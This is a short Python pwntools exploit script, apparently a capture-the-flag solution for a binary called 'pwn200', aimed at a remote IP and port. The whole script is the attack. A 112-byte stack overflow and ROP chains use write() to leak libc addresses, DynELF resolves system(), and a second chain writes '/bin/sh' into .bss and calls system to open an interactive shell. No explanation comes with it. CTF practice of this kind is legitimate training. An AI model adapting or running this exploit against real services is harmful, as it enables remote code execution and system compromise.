from pwn import *
io = remote('220.249.52.133','36548')
#io = process('./pwn200')
#context.log_level= 'debug'

elf = ELF('./pwn200')
ppp_r = 0x80485cd
read_got = elf.got['read']
read_plt = elf.plt['read']
main_addr = 0x80484be
start_addr = 0x80483d0
write_plt = elf.plt['write']
write_got = elf.got['write']
func_addr = 0x8048484
def leak(address):
    payload1 = 'A'*112+p32(write_plt)+p32(func_addr)+p32(1)+p32(address)+p32(4)
    io.send(payload1)
    data = io.recv(4)
    print data
    return data
print io.recv()
dyn = DynELF(leak,elf=ELF('./pwn200'))

sys_addr = dyn.lookup('system','libc')
print 'system address: ',hex(sys_addr)
payload = 'a'*112+p32(start_addr)
io.send(payload)
io.recv()
bss_addr =elf.bss()
print 'bss addr: ',hex(bss_addr)

payload = 'a'*112 + p32(read_plt)+p32(ppp_r)+p32(0)+p32(bss_addr)+p32(8)
payload +=p32(sys_addr)+p32(func_addr)+p32(bss_addr)
io.send(payload)
io.send('/bin/sh')


io.interactive()